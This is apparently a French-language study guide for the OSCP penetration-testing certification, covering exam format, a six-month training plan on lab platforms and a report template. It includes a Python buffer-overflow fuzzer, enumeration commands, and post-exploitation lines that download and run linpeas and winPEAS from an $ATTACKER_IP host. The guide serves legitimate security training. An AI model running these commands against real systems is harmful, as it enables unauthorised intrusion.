# OSCP : préparer et réussir la certification

L'OSCP (Offensive Security Certified Professional) est la certification de pentesting la plus respectée dans l'industrie. Elle exige de compromettre réellement des machines dans un examen de **24 heures**. Ce guide vous donne le plan d'attaque complet pour la réussir.

## Pourquoi l'OSCP est différente de toutes les autres

```
Certifications classiques (QCM) :
→ CEH, Security+, CISSP
→ Testent la connaissance théorique
→ Mémorisez les réponses → Réussissez

OSCP :
→ Examen pratique de 24h en continu
→ Compromettez 3 machines indépendantes + un Active Directory
→ Rédigez un rapport professionnel en 24h supplémentaires
→ Pas de Google pendant l'examen, seulement vos notes
→ "Try Harder" — la philosophie Offensive Security
```

## Les prérequis avant de commencer

```
Niveau minimum requis :
✅ Linux confortable (navigation, scripting bash de base)
✅ Réseau : TCP/IP, ports, services, DNS, HTTP
✅ Python ou scripting (modifier des exploits)
✅ Avoir fait quelques CTF (HackTheBox, TryHackMe)

Idéalement :
✅ Expérience administration système
✅ Connaissances Windows (Active Directory)
✅ Programmation de base (C, Python)
✅ Compréhension des vulnérabilités web (OWASP Top 10)
```

## Le programme PEN-200

Le cours officiel Offensive Security couvre :

```
Modules principaux :
1. Getting Comfortable with Kali Linux
2. Command Line Fun
3. Practical Tools (Netcat, Wireshark, Tcpdump)
4. Bash Scripting
5. Passive Information Gathering (OSINT)
6. Active Information Gathering (Nmap, DNS enum)
7. Vulnerability Scanning (Nessus, Nikto)
8. Web Application Attacks (SQLi, XSS, Directory Traversal)
9. Introduction to Buffer Overflows
10. Windows Buffer Overflows
11. Linux Buffer Overflows
12. Client-Side Attacks
13. Locating Public Exploits
14. Fixing Exploits
15. File Transfers
16. Antivirus Evasion
17. Privilege Escalation (Linux + Windows)
18. Password Attacks
19. Port Redirection and SSH Tunneling
20. Active Directory Attacks
21. Metasploit Framework
22. PowerShell Empire
```

## Plan d'entraînement sur 6 mois

### Mois 1-2 : Fondations

```bash
# TryHackMe - Parcours recommandés
→ Pre-Security
→ Jr Penetration Tester
→ Offensive Pentesting

# HackTheBox Starting Point
→ Machines guidées pour débutants

# Objectifs :
✅ Maîtriser nmap (-sC -sV -p- --min-rate 5000)
✅ Comprendre les services courants (SSH, SMB, HTTP, FTP)
✅ Premier shell via Metasploit
✅ Escalade de privilèges basique Linux et Windows
```

### Mois 3-4 : Technique avancée

```bash
# HackTheBox - Machines Easy → Medium
# Objectif : résoudre 30-50 machines sans hints

# Plateformes spécialisées OSCP
→ Proving Grounds (Offensive Security) - officiel
→ VulnHub - machines téléchargeables
→ HackTheBox OSCP-like machines

# Compétences à développer :
✅ Buffer overflow Windows 32-bit (obligatoire à l'examen)
✅ Buffer overflow Linux (BOF)
✅ Active Directory : énumération et exploitation
✅ Pivoting et port forwarding
✅ Antivirus evasion basique

# Ressources incontournables :
→ PayloadsAllTheThings (GitHub) - cheatsheets
→ HackTricks (book.hacktricks.xyz) - référence complète
→ GTFOBins - escalade de privilèges Linux
→ LOLBAS - escalade de privilèges Windows
```

### Mois 5 : OSCP-specific

```bash
# S'abonner à PEN-200 et faire le lab
# Objectif : compromettre 40+ machines du lab

# Listes de machines OSCP-like sur HackTheBox (TJ Null list) :
# https://docs.google.com/spreadsheets/...
# Machines recommandées : Cronos, Bastard, Arctic, Devel, Beep

# Buffer Overflow - Pratiquer jusqu'à la maîtrise parfaite
# Processus standard :
1. Fuzzing (trouver le crash)
2. Contrôle EIP (trouver l'offset)
3. Identifier les bad chars
4. Trouver un JMP ESP
5. Générer shellcode avec msfvenom
6. Exploiter

# Script de fuzzing Python
import socket, time, sys

ip = "MACHINE_IP"
port = 1337
timeout = 5
prefix = "OVERFLOW1 "

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append(prefix + "A" * counter)
    counter += 100

for string in buffer:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            s.send(bytes(string + "\r\n", "latin-1"))
            s.recv(1024)
    except:
        print(f"Crash probable à {counter-100} bytes")
        sys.exit(0)
    print(f"Envoyé {len(string)} bytes")
    time.sleep(1)
```

### Mois 6 : Simulation d'examen

```bash
# Simuler l'examen PLUSIEURS FOIS avant le jour J

# Format de l'examen actuel (depuis 2022) :
→ 3 machines standalone (10, 20, 25 points)
→ 1 environnement Active Directory (40 points)
→ Total max : 100 points (dont rapport bonus)
→ Minimum pour réussir : 70 points

# Stratégie d'examen recommandée :
1h  : Énumération initiale de TOUTES les machines
2h  : Attaquer l'AD (40 points = priorité absolue)
4h  : Machine 25 points
3h  : Machine 20 points
2h  : Machine 10 points
12h : Bonus (documentation, recherches, machines restantes)

# Outils à maîtriser parfaitement :
nmap, gobuster, nikto, ffuf     # Énumération
linpeas.sh, winpeas.exe          # PrivEsc
bloodhound, crackmapexec         # Active Directory
impacket (psexec, secretsdump)   # AD exploitation
chisel, socat, ssh               # Tunneling/pivoting
msfvenom                         # Génération de payloads
```

## Méthodologie générale

```bash
# Template de notes pour chaque machine

# 1. ÉNUMÉRATION
## Nmap
nmap -sC -sV -p- --min-rate 5000 -oA nmap/initial $IP
nmap -sU -top-ports 100 $IP  # UDP aussi !

## Web (si port 80/443)
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
nikto -h http://$IP
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://$IP/FUZZ

## SMB (si port 445)
smbclient -L //$IP -N
enum4linux -a $IP
crackmapexec smb $IP

# 2. EXPLOITATION
## Chercher des exploits
searchsploit [service] [version]
# Google : "[service] [version] exploit github"

# 3. POST-EXPLOITATION
## Linux PrivEsc
wget http://$ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh

## Windows PrivEsc
certutil -urlcache -split -f http://$ATTACKER_IP/winPEAS.exe C:\Windows\Temp\winpeas.exe
C:\Windows\Temp\winpeas.exe

# 4. ROOT/SYSTEM
whoami && hostname && ipconfig/ifconfig
cat /root/root.txt  # ou C:\Users\Administrator\Desktop\root.txt
```

## Le rapport OSCP

```markdown
# Structure du rapport officiel

1. Introduction
   - Objectifs de l'évaluation
   - Périmètre testé

2. Executive Summary
   - Résumé pour la direction
   - Machines compromises

3. Pour CHAQUE machine :
   ## Nom de la machine (IP)
   ### Service vulnérable identifié
   - Description de la vulnérabilité
   - Impact potentiel

   ### Exploitation
   - Proof of concept (commandes exactes)
   - Screenshots à chaque étape clé
   - Hash du fichier proof.txt

   ### Escalade de privilèges
   - Technique utilisée
   - Screenshots root/SYSTEM

   ### Recommandations
   - Comment corriger la vulnérabilité

4. Annexes
   - Sorties nmap complètes
   - Code d'exploit modifié
```

## Ressources indispensables

```
Gratuit :
→ TryHackMe (tente)       : apprendre les bases
→ HackTheBox (free tier)  : pratiquer
→ VulnHub                 : machines hors-ligne
→ PortSwigger Academy     : web hacking complet
→ HackTricks              : référence absolue
→ IppSec YouTube          : walkthroughs HTB

Payant mais worth it :
→ TCM Security (Heath Adams) : cours abordables
→ Udemy (cours OSCP prep)    : souvent en promo 15€
→ HTB VIP                    : accès aux vieilles machines

Cheatsheets :
→ PayloadsAllTheThings (GitHub)
→ GTFOBins (Linux privesc)
→ LOLBAS (Windows privesc)
→ Revshells.com (reverse shells)
```

## Conclusion

L'OSCP n'est pas une certification qu'on passe en quelques semaines — c'est un **parcours de 6-12 mois** qui transforme un débutant en pentester opérationnel. La clé : **pratiquer, documenter, recommencer**. Chaque machine que vous ne pouvez pas compromettre seul est une leçon. "Try Harder" n'est pas une insulte — c'est la méthode.

---
*Article suivant : [Red Team vs Blue Team](../articles/red-team-blue-team)*
